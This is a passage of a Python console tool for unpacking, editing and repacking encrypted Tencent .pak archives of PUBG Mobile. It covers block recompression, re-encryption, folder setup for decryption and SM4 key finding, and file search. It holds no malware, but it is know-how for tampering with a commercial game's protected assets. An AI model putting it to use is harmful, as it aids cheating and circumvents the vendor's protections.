                                f"[red]   Your edited file ({_new_data_size:,} bytes) is LARGER than the original "
                                f"({entry.uncompressed_size:,} bytes).\n"
                                f"   REPACK ABORTED for {file_name} — file is too big to fit.[/]"
                            )
                            failed_blocks = total_blocks
                            if report is not None:
                                report.add_result(FileRepackResult(
                                    file_name       = file_name,
                                    file_path       = str(dir_path / file_name),
                                    total_blocks    = total_blocks,
                                    repacked_blocks = 0,
                                    skipped_blocks  = 0,
                                    failed_blocks   = failed_blocks,
                                    status          = "FAILED"
                                ))
                            continue
                        # ── END DEBUG / ABORT CHECK ───────────────────────────────

                        # ── Uncompressed file ─────────────────────────────────────
                        if entry.compression_method == const.CM_NONE:
                            data_to_write = modified_data
                            if entry.encrypted:
                                data_to_write = PakCrypto.encrypt_block(
                                    modified_data, modified_file_path, entry.encryption_method
                                )

                            if len(data_to_write) > entry.size:
                                console.print(
                                    f"[red]    ERROR: File too large after processing: {file_name}[/red]"
                                )
                                failed_blocks = 1
                            else:
                                target_file.seek(entry.offset)
                                target_file.write(data_to_write)
                                console.print(f"[green]    SUCCESS: {file_name} repacked[/green]")
                                repacked_blocks = 1
                                total_blocks    = 1

                        # ── Compressed file (block by block) ─────────────────────
                        else:
                            block_indices  = PakCrypto.generate_block_indices(
                                len(entry.compressed_blocks), entry.encryption_method
                            )
                            total_blocks   = len(block_indices)
                            uncomp_offset  = 0

                            for i, block_index in enumerate(block_indices):
                                block_info   = entry.compressed_blocks[block_index]
                                chunk_size   = entry.compression_block_size
                                max_space    = block_info.end - block_info.start
                                final_space  = PakCrypto.align_encrypted_content_size(
                                    max_space, entry.encryption_method
                                )

                                uncomp_chunk = modified_data[uncomp_offset: uncomp_offset + chunk_size]
                                uncomp_offset += chunk_size

                                if not uncomp_chunk:
                                    break

                                # Try default compression first
                                if entry.compression_method == const.CM_ZLIB:
                                    comp_chunk = PakCompression.compress_block(
                                        uncomp_chunk, self._zstd_dict,
                                        entry.compression_method, level=9
                                    )
                                else:
                                    comp_chunk = PakCompression.compress_block(
                                        uncomp_chunk, self._zstd_dict,
                                        entry.compression_method, level=22
                                    )

                                data_to_write = comp_chunk
                                if entry.encrypted:
                                    data_to_write = PakCrypto.encrypt_block(
                                        data_to_write, modified_file_path, entry.encryption_method
                                    )

                                aligned_len = PakCrypto.align_encrypted_content_size(
                                    len(data_to_write), entry.encryption_method
                                )

                                # ===== IMPROVED OVERFLOW HANDLING FOR LARGE BLOCKS =====
                                if aligned_len > final_space:
                                    # For large block indices (121+), be more aggressive
                                    block_num = i + 1
                                    is_large_block = block_num >= 121
                                    
                                    if is_large_block:
                                        console.print(
                                            f"\n[yellow]    ⚙ Block [{block_num}] overflow (LARGE BLOCK) "
                                            f"({aligned_len} > {final_space}) — "
                                            f"attempting aggressive compression...[/yellow]"
                                        )
                                    else:
                                        console.print(
                                            f"\n[yellow]    ⚙ Block [{block_num}] overflow "
                                            f"({aligned_len} > {final_space}) — "
                                            f"trying all compression levels...[/yellow]"
                                        )
                                    
                                    use_dict = (self._zstd_dict
                                                if entry.compression_method == const.CM_ZSTD_DICT
                                                else None)
                                    
                                    # Increased max_space for large blocks - allows small overflow
                                    overflow_tolerance = final_space + 512 if is_large_block else final_space
                                    
                                    fitted, fitted_aligned = try_fit_block_enhanced(
                                        uncomp_chunk, overflow_tolerance,
                                        entry.compression_method,
                                        use_dict,
                                        modified_file_path,
                                        entry.encrypted,
                                        entry.encryption_method,
                                        allow_overflow=is_large_block
                                    )
                                    
                                    if fitted is not None:
                                        data_to_write = fitted
                                        aligned_len = fitted_aligned
                                        
                                        if fitted_aligned > final_space:
                                            console.print(
                                                f"[yellow]    ✔ Block [{block_num}] fitted with overflow "
                                                f"({fitted_aligned} ≤ {overflow_tolerance})[/yellow]"
                                            )
                                        else:
                                            console.print(
                                                f"[green]    ✔ Block [{block_num}] fitted "
                                                f"({fitted_aligned} ≤ {final_space})[/green]"
                                            )
                                    else:
                                        console.print(
                                            f"[red]    ❌ Block [{block_num}] cannot fit after all "
                                            f"compression levels — skipping[/red]"
                                        )
                                        skipped_blocks += 1
                                        continue

                                # Write block
                                target_file.seek(block_info.start)
                                target_file.write(data_to_write)
                                if aligned_len < len(data_to_write) + (final_space - aligned_len):
                                    padding = final_space - len(data_to_write)
                                    if padding > 0:
                                        target_file.write(b"\x00" * padding)

                                repacked_blocks += 1
                                if repacked_blocks % 10 == 0:
                                    console.print(f"    [dim]→ Block {repacked_blocks}/{total_blocks} completed[/dim]", end="\r")

                            if skipped_blocks > 0:
                                console.print(
                                    f"\n[bold yellow]PARTIAL:[/] [cyan]{file_name}[/] "
                                    f"({repacked_blocks}/{total_blocks} blocks, "
                                    f"{skipped_blocks} skipped)"
                                )
                            else:
                                console.print(
                                    f"\n[bold green]    SUCCESS:[/] [cyan]{file_name}[/] "
                                    f"[green]— {repacked_blocks}/{total_blocks} blocks repacked[/green]"
                                )

                    except Exception as e:
                        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
                        console.print(
                            f"[bold red]    ERROR processing[/] "
                            f"[cyan]{file_name}[/]: [red]{error_msg}[/]"
                        )
                        traceback.print_exc()
                        failed_blocks = total_blocks

                    # ── Record result ─────────────────────────────────────────────
                    if report is not None:
                        if failed_blocks == total_blocks and repacked_blocks == 0:
                            status = "FAILED"
                        elif skipped_blocks > 0 or failed_blocks > 0:
                            status = "PARTIAL"
                        else:
                            status = "OK"

                        report.add_result(FileRepackResult(
                            file_name      = file_name,
                            file_path      = str(dir_path / file_name),
                            total_blocks   = total_blocks,
                            repacked_blocks= repacked_blocks,
                            skipped_blocks = skipped_blocks,
                            failed_blocks  = failed_blocks,
                            status         = status
                        ))

def create_folder_structure() -> None:
    """Create the required folder structure if not exists."""
    if not BASE_DIR.exists():
        BASE_DIR.mkdir(parents=True, exist_ok=True)
        console.print(Panel(
            f"[green]✅ Created main tool directory: {BASE_DIR}[/green]",
            title="Folder Setup",
            border_style="green"
        ))
    
    for main_folder, sub_folders in FOLDER_STRUCTURE.items():
        folder_path = BASE_DIR / main_folder
        if not folder_path.exists():
            folder_path.mkdir(exist_ok=True)
            console.print(f"[cyan]📁 Created folder: {main_folder}[/cyan]")
        
        for sub_folder in sub_folders:
            sub_path = folder_path / sub_folder
            if not sub_path.exists():
                sub_path.mkdir(exist_ok=True)
                console.print(f"[cyan]   └── Created subfolder: {sub_folder}[/cyan]")
    
    # ── DAT_COMPARE folders (ONLY place where COMPARE_DAT belongs) ──────
    dat_cmp_dir = BASE_DIR / 'DAT_COMPARE'
    for sub in ['Original', 'Modded', 'RESULTS', 'COMPARE_DAT']:
        (dat_cmp_dir / sub).mkdir(parents=True, exist_ok=True)
    
    # Inside COMPARE_DAT, create subfolders
    compare_dir = dat_cmp_dir / 'COMPARE_DAT'
    for sub_folder in ['Original_PAK', 'Modded_PAK', 'Modified_Files']:
        (compare_dir / sub_folder).mkdir(parents=True, exist_ok=True)
    
    # Create encryption subdirectories
    enc_dir = BASE_DIR / 'ENCRYPTION'
    for sub in ['NORMAL_ENC', 'CUSTOM_ENC', 'DECRYPT']:
        for folder in ['INPUT', 'OUTPUT']:
            (enc_dir / sub / folder).mkdir(parents=True, exist_ok=True)
    
    # Create SKIN_TOOL directory structure
    skin_tool_dir = BASE_DIR / 'SKIN_TOOL'
    if not skin_tool_dir.exists():
        skin_tool_dir.mkdir(parents=True, exist_ok=True)
        console.print(f"[cyan]📁 Created folder: SKIN_TOOL[/cyan]")
    
    for main_folder, sub_folders in SKIN_FOLDER_STRUCTURE.items():
        folder_path = skin_tool_dir / main_folder
        if not folder_path.exists():
            folder_path.mkdir(exist_ok=True)
            console.print(f"[cyan]📁 Created folder: SKIN_TOOL/{main_folder}[/cyan]")
        
        for sub_folder in sub_folders:
            sub_path = folder_path / sub_folder
            if not sub_path.exists():
                sub_path.mkdir(parents=True, exist_ok=True)
                console.print(f"[cyan]   └── Created subfolder: {sub_folder}[/cyan]")

    # ── Integrated SM4_FINDER folders ────────────────────────────
    sm4_dir = BASE_DIR / 'SM4_FINDER'
    for sub in ['input', 'output/json', 'output/txt']:
        (sm4_dir / sub).mkdir(parents=True, exist_ok=True)

    # ── Integrated ACTIVE_SAV folders ────────────────────────────
    asav_dir = BASE_DIR / 'ACTIVE_SAV'
    for sub in ['Backups', 'Templates']:
        (asav_dir / sub).mkdir(parents=True, exist_ok=True)
    
    # ── LUA_JAR_FILES folder with README ─────────────────────────
    lua_jar_dir = BASE_DIR / ''
    lua_jar_dir.mkdir(parents=True, exist_ok=True)
    
    # Create README for LUA_JAR_FILES
    readme_file = lua_jar_dir / "README.txt"
    if not readme_file.exists():
        readme_file.write_text("""╔═══════════════════════════════════════════════════════════════╗
║                    LUA JAR FILES                          ║
║                                                              ║
║  Place these required files here for LUA Tool:             ║
║                                                              ║
║  Required Files:                                            ║
║  ├── unluac_patched.jar  ← Primary decompiler              ║
║  ├── luadec.exe          ← Secondary decompiler (Windows)  ║
║  ├── lua53.dll           ← Lua runtime (Windows)           ║
║  └── decyash.exe         ← Additional tool                 ║
║                                                              ║
║  Credit: YASHBHAIxOP / TG@YASHBHAIxOP                      ║
╚═══════════════════════════════════════════════════════════════╝""", encoding='utf-8')

    console.print(Panel(
        f"[green]✅ Folder structure created/verified in: {BASE_DIR}[/green]",
        title="Setup Complete",
        border_style="green"
    ))

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """Display pixel-style VIP banner (SHIVAM/CHETAN aesthetic)."""
    clear_screen()

    # ── Pixel-block logo ──────────────────────────────────────────
    LOGO_LINES = [
        " ███████╗ ██╗   ██╗ ██████╗  ██╗  ██╗  █████╗  ███╗  ██╗",
        " ██╔════╝ ██║   ██║ ██╔══██╗ ██║  ██║ ██╔══██╗ ████╗ ██║",
        " ███████╗ ██║   ██║ ██████╔╝ ███████║ ███████║ ██╔██╗██║",
        " ╚════██║ ██║   ██║ ██╔══██╗ ██╔══██║ ██╔══██║ ██║╚████║",
        " ███████║ ╚██████╔╝ ██████╔╝ ██║  ██║ ██║  ██║ ██║ ╚███║",
        " ╚══════╝  ╚═════╝  ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝  ╚══╝",
    ]
    logo_text = Text("\n".join(LOGO_LINES), style="bold cyan", justify="center")

    console.print(Panel(
        Align.center(logo_text),
        box=box.SQUARE,
        border_style="bold cyan",
        padding=(0, 2),
    ))

    # ── Subtitle bar ─────────────────────────────────────────────
    sub = Text(justify="center")
    sub.append("  ALL PUBG  ", style="bold cyan")
    sub.append("──►  ", style="dim white")
    sub.append("SUPPORT", style="bold yellow")
    sub.append("    DEVELOPER  ", style="bold cyan")
    sub.append("──►  ", style="dim white")
    sub.append("@Black_Toxic000", style="bold yellow")
    sub.append("    V4.5  ", style="bold cyan")
    console.print(Panel(
        Align.center(sub),
        box=box.SQUARE,
        border_style="yellow",
        padding=(0, 0),
    ))

    # ── Status bar ───────────────────────────────────────────────
    status = Text(justify="center")
    status.append("  🟢 LICENSED", style="bold green")
    status.append("   │   ", style="dim white")
    status.append(
    f"📅 {datetime.now().strftime('%Y-%m-%d  %I:%M:%S %p')}",
    style="bold cyan")
    status.append("   │   ", style="dim white")
    status.append("📂 TOXIC_4.5", style="bold white")
    status.append("   │   ", style="dim white")
    status.append("🛡️ SECURE  ", style="bold green")
    console.print(Align.center(status))
    console.print()

def get_pak_files(folder_type: str) -> list[Path]:
    """Get list of .pak files in the INPUT folder for the given type."""
    input_dir = BASE_DIR / folder_type / 'INPUT'
    if not input_dir.exists():
        return []
    return list(input_dir.glob("*.pak"))

def select_pak_file(folder_type: str, title: str) -> Path | None:
    """Show list of .pak files and let user select one."""
    pak_files = get_pak_files(folder_type)
    
    if not pak_files:
        console.print(Panel(
            f"[red]❌ No .pak files found in {BASE_DIR / folder_type / 'INPUT'}![/red]\n"
            f"[cyan]💡 Please place your .pak files in the INPUT folder.[/cyan]",
            title="Error",
            border_style="red"
        ))
        return None
    
    table = Table(title=title, box=box.SIMPLE, style="cyan")
    table.add_column("No.", style="cyan", justify="center")
    table.add_column("File Name", style="white")
    table.add_column("Size", style="yellow")
    
    for i, pak_file in enumerate(pak_files, 1):
        size = pak_file.stat().st_size
        size_str = f"{size / (1024*1024):.1f} MB" if size > 1024*1024 else f"{size / 1024:.1f} KB"
        table.add_row(str(i), pak_file.name, size_str)
    
    table.add_row(str(len(pak_files) + 1), "Back to Menu", "")
    console.print(table)
    
    try:
        choice = int(Prompt.ask(f"[white]Select file (1-{len(pak_files) + 1})[/white]", console=console))
        if choice == len(pak_files) + 1:
            return None
        elif 1 <= choice <= len(pak_files):
            return pak_files[choice - 1]
        else:
            console.print(Panel("[red]❌ Invalid selection[/red]", title="Error", border_style="red"))
            return None
    except ValueError:
        console.print(Panel("[red]❌ Invalid input[/red]", title="Error", border_style="red"))
        return None

def handle_unpack(folder_type: str, type_name: str):
    """Handle unpack operation for a specific type."""
    pak_file = select_pak_file(folder_type, f"Unpack {type_name}")
    if not pak_file:
        return
    
    # Show unpack options
    console.print(Panel(
        f"[cyan]📦 Unpack Options for: {pak_file.name}[/cyan]",
        title="Unpack Mode",
        border_style="cyan"
    ))
    
    table = Table(title="Select Unpack Mode", box=box.SIMPLE, style="cyan")
    table.add_column("Option", style="cyan", justify="center")
    table.add_column("Mode", style="white")
    table.add_column("Description", style="yellow")
    table.add_row("1", "📁 Folder Wise Unpack", "Original folder structure maintain karega")
    table.add_row("2", "📄 Only File Unpack", "Sirf files without folders")
    console.print(table)
    
    try:
        unpack_mode = Prompt.ask("[white]Select unpack mode (1-2)[/white]", console=console).strip()
    except KeyboardInterrupt:
        return
    
    if unpack_mode not in ["1", "2"]:
        console.print(Panel("[red]❌ Invalid option[/red]", title="Error", border_style="red"))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    output_folder = BASE_DIR / folder_type / 'UNPACKED' / pak_file.stem
    
    if unpack_mode == "1":
        # Folder Wise Unpack (Using 3.py logic)
        console.print(Panel(
            f"[blue]📁 Folder Wise Unpacking: {pak_file.name}[/blue]",
            title="Unpacking",
            border_style="blue"
        ))
        
        try:
            is_od_pack = folder_type == 'OD_PAK'
            pak_instance = TencentPakFile(pak_file, is_od=is_od_pack)
            pak_instance.dump(output_folder)
            
            console.print(Panel(
                f"[green]✅ Folder Wise Unpack complete![/green]\n"
                f"[cyan]📁 Files extracted to: {output_folder}[/cyan]\n"
                f"[yellow]💡 Original folder structure maintained[/yellow]",
                title="Success",
                border_style="green"
            ))
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(Panel(f"[red]❌ Unpack failed: {error_msg}[/red]", title="Error", border_style="red"))
            traceback.print_exc()
    
    elif unpack_mode == "2":
        # Only File Unpack - Using the new logic
        console.print(Panel(
            f"[blue]📄 Only File Unpacking: {pak_file.name}[/blue]",
            title="Unpacking",
            border_style="blue"
        ))
        
        try:
            is_od_pack = folder_type == 'OD_PAK'
            pak_instance = TencentPakFile(pak_file, is_od=is_od_pack)
            
            # First unpack with folder structure
            temp_folder = output_folder / "temp"
            pak_instance.dump(temp_folder)
            
            # Then move all files to root folder
            console.print(f"[cyan]🔄 Moving files to single folder...[/cyan]")
            
            # Get all files from temp folder
            all_files = []
            for root, dirs, files in os.walk(temp_folder):
                for file in files:
                    all_files.append(Path(root) / file)
            
            # Move files to main folder
            moved_count = 0
            for file_path in all_files:
                try:
                    new_path = output_folder / file_path.name
                    # Handle duplicate names
                    counter = 1
                    while new_path.exists():
                        new_path = output_folder / f"{file_path.stem}_{counter}{file_path.suffix}"
                        counter += 1
                    
                    shutil.move(str(file_path), str(new_path))
                    moved_count += 1
                except Exception as e:
                    console.print(f"[yellow]⚠ Could not move {file_path.name}: {e}[/yellow]")
            
            # Remove temp folder
            shutil.rmtree(temp_folder)
            
            console.print(Panel(
                f"[green]✅ Only File Unpack complete![/green]\n"
                f"[cyan]📄 Files successfully moved: {moved_count}[/cyan]\n"
                f"[cyan]📁 All files in: {output_folder}[/cyan]\n"
                f"[yellow]💡 No subdirectories, all files in single folder[/yellow]",
                title="Success",
                border_style="green"
            ))
            
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(Panel(f"[red]❌ Unpack failed: {error_msg}[/red]", title="Error", border_style="red"))
            traceback.print_exc()
    
    Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

def handle_repack(folder_type: str, type_name: str):
    """Handle repack operation for a specific type."""
    pak_file = select_pak_file(folder_type, f"Repack {type_name}")
    if not pak_file:
        return
    
    edited_folder = BASE_DIR / folder_type / 'EDITED'
    if not edited_folder.exists() or not any(edited_folder.rglob("*")):
        console.print(Panel(
            f"[red]❌ No edited files found in {edited_folder}![/red]\n"
            f"[cyan]💡 Place your edited files in the EDITED folder with the same structure as UNPACKED.[/cyan]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    output_pak = BASE_DIR / folder_type / 'REPACKED' / f"{pak_file.stem}.pak"
    output_pak.parent.mkdir(exist_ok=True)

    # ── Chetan-style repack header ────────────────────────────────────────────
    console.print()
    console.print(f"[bold green]🚀 Repacking {pak_file.name}...[/]")
    console.print(f"[bold cyan]🧩 Repack Mode: {folder_type}[/]")
    console.print(f"[dim]🔍 Matching files from[/]")
    console.print(f"[dim]{edited_folder}[/]")
    console.print()

    # Walk edited folder and collect matched files
    _edited_files = [p for p in edited_folder.rglob("*") if p.is_file()]
    _matched = []
    for _ef in _edited_files:
        try:
            _rel = _ef.relative_to(edited_folder)
            _matched.append((_ef.name, str(_rel)))
        except Exception:
            pass

    for _fname, _fpath in _matched:
        console.print(f"[green]✓ Match:[/] [white]{_fname}[/] →")
        console.print(f"[dim]{_fpath}[/]")

    console.print()
    console.print(f"[bold cyan]📊 Matching Summary:[/]")
    console.print(f"[green]✓ Files matched: {len(_matched)}[/]")
    console.print()
    # ── End header ────────────────────────────────────────────────────────────

    try:
        is_od_pack = folder_type == 'OD_PAK'
        
        # Copy original pak to repacked folder
        shutil.copy2(pak_file, output_pak)
        console.print(
            f"[green]✅ Original file copied to:\n{output_pak}[/green]"
        )
        console.print()
        
        # Build report
        report = RepackReport(pak_name=pak_file.name, out_path=str(output_pak))
        
        # Load pak file and repack
        pak_instance = TencentPakFile(pak_file, is_od=is_od_pack)
        pak_instance.repack(edited_folder, output_pak, report=report)
        
        # Print professional report
        report.print_report()

        # ── Chetan-style footer ───────────────────────────────────────────────
        console.print()
        with Progress(
            TextColumn(f"  Repacking {pak_file.name}"),
            BarColumn(bar_width=40, style="green", complete_style="bold green"),
            console=console,
            transient=False,
        ) as _prog:
            _t = _prog.add_task("done", total=100)
            _prog.update(_t, completed=100)

        console.print()
        # Check if any files failed due to size mismatch
        _failed = [r for r in report.results if r.status == "FAILED"]
        if _failed:
            console.print(f"[bold red]❌ REPACK HAD FAILURES — {len(_failed)} file(s) were NOT repacked due to size mismatch.[/]")
            for _fr in _failed:
                console.print(f"[red]   • {_fr.file_name}[/]")
        else:
            console.print(f"[bold green]✅ REPACK COMPLETED SUCCESSFULLY![/]")
            console.print(f"[cyan]📦 Original file replaced with repacked version[/]")

        # Count total files in pak
        try:
            _pi2 = TencentPakFile(output_pak, is_od=is_od_pack)
            _total_in_pak = sum(len(v) for v in _pi2._index.values())
            console.print(f"[cyan]📄 Total files in pak: {_total_in_pak}[/]")
        except Exception:
            pass
        # ── End footer ────────────────────────────────────────────────────────
        
    except Exception as e:
        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
        console.print(Panel(f"[red]❌ Repack failed: {error_msg}[/red]", title="Error", border_style="red"))
        traceback.print_exc()
    
    Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

def handle_clear_data(folder_type: str, type_name: str):
    """Handle clearing unpacked data for a specific type."""
    unpacked_dir = BASE_DIR / folder_type / 'UNPACKED'
    
    if not unpacked_dir.exists() or not any(unpacked_dir.iterdir()):
        console.print(Panel(
            f"[yellow]⚠ No unpacked data found for {type_name}[/yellow]",
            title="Info",
            border_style="yellow"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    folders = [d for d in unpacked_dir.iterdir() if d.is_dir()]
    
    if not folders:
        console.print(Panel(
            f"[yellow]⚠ No unpacked folders found for {type_name}[/yellow]",
            title="Info",
            border_style="yellow"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    table = Table(title=f"Unpacked Data - {type_name}", box=box.SIMPLE, style="cyan")
    table.add_column("No.", style="cyan", justify="center")
    table.add_column("Folder Name", style="white")
    
    for i, folder in enumerate(folders, 1):
        table.add_row(str(i), folder.name)
    
    table.add_row(str(len(folders) + 1), "Delete All")
    table.add_row(str(len(folders) + 2), "Back to Menu")
    
    console.print(table)
    
    try:
        choice = int(Prompt.ask(f"[white]Select option (1-{len(folders) + 2})[/white]", console=console))
        
        if choice == len(folders) + 2:
            return
        elif choice == len(folders) + 1:
            confirm = Prompt.ask(
                f"[red]Delete ALL unpacked data for {type_name}? (y/n)[/red]",
                choices=['y', 'n'],
                console=console
            ).lower()
            if confirm == 'y':
                for folder in folders:
                    try:
                        shutil.rmtree(folder)
                        console.print(f"[green]✅ Deleted: {folder.name}[/green]")
                    except Exception as e:
                        console.print(f"[red]❌ Failed to delete {folder.name}: {e}[/red]")
        elif 1 <= choice <= len(folders):
            folder = folders[choice - 1]
            confirm = Prompt.ask(
                f"[red]Delete {folder.name}? (y/n)[/red]",
                choices=['y', 'n'],
                console=console
            ).lower()
            if confirm == 'y':
                try:
                    shutil.rmtree(folder)
                    console.print(f"[green]✅ Deleted: {folder.name}[/green]")
                except Exception as e:
                    console.print(f"[red]❌ Failed to delete {folder.name}: {e}[/red]")
        else:
            console.print(Panel("[red]❌ Invalid selection[/red]", title="Error", border_style="red"))
    except ValueError:
        console.print(Panel("[red]❌ Invalid input[/red]", title="Error", border_style="red"))
    
    Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

def search_text_in_files(folder_type: str, type_name: str):
    """Search for text content in unpacked files."""
    unpacked_dir = BASE_DIR / folder_type / 'UNPACKED'
    
    if not unpacked_dir.exists() or not any(unpacked_dir.iterdir()):
        console.print(Panel(
            f"[red]❌ No unpacked data found for {type_name}![/red]\n"
            f"[cyan]💡 Please unpack files first to use search functionality.[/cyan]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    # Get all unpacked folders
    folders = [d for d in unpacked_dir.iterdir() if d.is_dir()]
    
    if not folders:
        console.print(Panel(
            f"[red]❌ No unpacked folders found for {type_name}![/red]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    # Show folder selection
    table = Table(title=f"Select Unpacked Folder - {type_name}", box=box.SIMPLE, style="cyan")
    table.add_column("No.", style="cyan", justify="center")
    table.add_column("Folder Name", style="white")
    table.add_column("Files Count", style="yellow")
    
    for i, folder in enumerate(folders, 1):
        file_count = len(list(folder.rglob("*"))) if folder.exists() else 0
        table.add_row(str(i), folder.name, str(file_count))
    
    console.print(table)
    
    try:
        choice = int(Prompt.ask(f"[white]Select folder to search in (1-{len(folders)})[/white]", console=console))
        if not 1 <= choice <= len(folders):
            console.print(Panel("[red]❌ Invalid selection[/red]", title="Error", border_style="red"))
            return
        
        selected_folder = folders[choice - 1]
        
        # Get search text
        search_text = Prompt.ask("[white]Enter text to search[/white]", console=console).strip()
        if not search_text:
            console.print(Panel("[red]❌ Search text cannot be empty[/red]", title="Error", border_style="red"))
            return
        
        console.print(Panel(
            f"[blue]🔍 Searching for: '{search_text}' in {selected_folder.name}[/blue]",
            title="Searching",
            border_style="blue"
        ))
        
        # Create search results folder
        search_results_dir = BASE_DIR / folder_type / 'SEARCH_RESULTS' / f"text_search_{search_text[:20]}"
        search_results_dir.mkdir(parents=True, exist_ok=True)
        
        # Search in files
        found_files = []
        total_files = 0
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console,
            expand=True
        ) as progress:
            task_id = progress.add_task("[cyan]Searching files...", total=0)
            
            # First, count total files for progress
            file_list = list(selected_folder.rglob("*"))
            file_list = [f for f in file_list if f.is_file()]
            total_files = len(file_list)
            progress.update(task_id, total=total_files)
            
            for file_path in file_list:
                progress.update(task_id, description=f"[cyan]Searching: {file_path.name[:30]}...")
                
                try:
                    # Try to read as text file
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if search_text.lower() in content.lower():
                            found_files.append(file_path)
                            
                            # Copy to search results
                            relative_path = file_path.relative_to(selected_folder)
                            dest_path = search_results_dir / relative_path
                            dest_path.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(file_path, dest_path)
                            
                except:
                    # If text reading fails, try binary search
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            if search_text.encode('utf-8', errors='ignore') in content:
                                found_files.append(file_path)
                                
                                # Copy to search results
                                relative_path = file_path.relative_to(selected_folder)
                                dest_path = search_results_dir / relative_path
                                dest_path.parent.mkdir(parents=True, exist_ok=True)
                                shutil.copy2(file_path, dest_path)
                    except:
                        pass
                
                progress.update(task_id, advance=1)
        
        # Show results
        console.print(Panel(
            f"[green]✅ Search complete![/green]\n"
            f"[cyan]📁 Searched in: {selected_folder.name}[/cyan]\n"
            f"[cyan]🔍 Search text: '{search_text}'[/cyan]\n"
            f"[cyan]📄 Files searched: {total_files}[/cyan]\n"
            f"[cyan]✅ Files found: {len(found_files)}[/cyan]\n"
            f"[cyan]📂 Results saved to: {search_results_dir}[/cyan]",
            title="Search Results",
            border_style="green"
        ))
        
        if found_files:
            table = Table(title="Found Files", box=box.SIMPLE, style="green")
            table.add_column("No.", style="green", justify="center")
            table.add_column("File Name", style="white")
            table.add_column("Path", style="yellow")
            
            for i, file_path in enumerate(found_files[:20], 1):  # Show first 20 files
                relative_path = file_path.relative_to(selected_folder)
                table.add_row(str(i), file_path.name, str(relative_path))
            
            if len(found_files) > 20:
                table.add_row("...", f"... and {len(found_files) - 20} more files", "...")
            
            console.print(table)
        
    except ValueError:
        console.print(Panel("[red]❌ Invalid input[/red]", title="Error", border_style="red"))
    except Exception as e:
        console.print(Panel(f"[red]❌ Search failed: {e}[/red]", title="Error", border_style="red"))
        traceback.print_exc()
    
    Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")

def search_files_by_name(folder_type: str, type_name: str):
    """Search for files by name in unpacked folders."""
    unpacked_dir = BASE_DIR / folder_type / 'UNPACKED'
    
    if not unpacked_dir.exists() or not any(unpacked_dir.iterdir()):
        console.print(Panel(
            f"[red]❌ No unpacked data found for {type_name}![/red]\n"
            f"[cyan]💡 Please unpack files first to use search functionality.[/cyan]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    # Get all unpacked folders
    folders = [d for d in unpacked_dir.iterdir() if d.is_dir()]
    
    if not folders:
        console.print(Panel(
            f"[red]❌ No unpacked folders found for {type_name}![/red]",
            title="Error",
            border_style="red"
        ))
        Prompt.ask("[white]Press Enter to continue...[/white]", console=console, default="")
        return
    
    # Show folder selection
    table = Table(title=f"Select Unpacked Folder - {type_name}", box=box.SIMPLE, style="cyan")
    table.add_column("No.", style="cyan", justify="center")
    table.add_column("Folder Name", style="white")
    table.add_column("Files Count", style="yellow")
    
    for i, folder in enumerate(folders, 1):
        file_count = len(list(folder.rglob("*"))) if folder.exists() else 0
        table.add_row(str(i), folder.name, str(file_count))
    
    console.print(table)
    
    try:
        choice = int(Prompt.ask(f"[white]Select folder to search in (1-{len(folders)})[/white]", console=console))
        if not 1 <= choice <= len(folders):
            console.print(Panel("[red]❌ Invalid selection[/red]", title="Error", border_style="red"))
            return
        
        selected_folder = folders[choice - 1]
        
        # Get search filename
        search_filename = Prompt.ask("[white]Enter filename to search (supports * wildcards)[/white]", console=console).strip()
        if not search_filename:
            console.print(Panel("[red]❌ Filename cannot be empty[/red]", title="Error", border_style="red"))
            return
        
        console.print(Panel(
            f"[blue]🔍 Searching for: '{search_filename}' in {selected_folder.name}[/blue]",
            title="Searching",
            border_style="blue"
        ))
        
        # Create search results folder
        search_results_dir = BASE_DIR / folder_type / 'SEARCH_RESULTS' / f"name_search_{search_filename[:20].replace('*', 'wildcard')}"
        search_results_dir.mkdir(parents=True, exist_ok=True)
        
        # Search for files
        found_files = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console,
            expand=True
        ) as progress:
            # Convert wildcard pattern to regex
            pattern = search_filename.replace('*', '.*')
            regex = re.compile(pattern, re.IGNORECASE)
            
            # Get all files
            file_list = list(selected_folder.rglob("*"))
            file_list = [f for f in file_list if f.is_file()]
            total_files = len(file_list)
            
            task_id = progress.add_task("[cyan]Searching files...", total=total_files)
            
            for file_path in file_list:
                progress.update(task_id, description=f"[cyan]Searching: {file_path.name[:30]}...")
                
                # Check if filename matches pattern
                if regex.search(file_path.name):
                    found_files.append(file_path)
                    
                    # Copy to search results
                    relative_path = file_path.relative_to(selected_folder)
                    dest_path = search_results_dir / relative_path
                    dest_path.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(file_path, dest_path)
                
                progress.update(task_id, advance=1)
        
        # Show results
        console.print(Panel(
            f"[green]✅ Search complete![/green]\n"
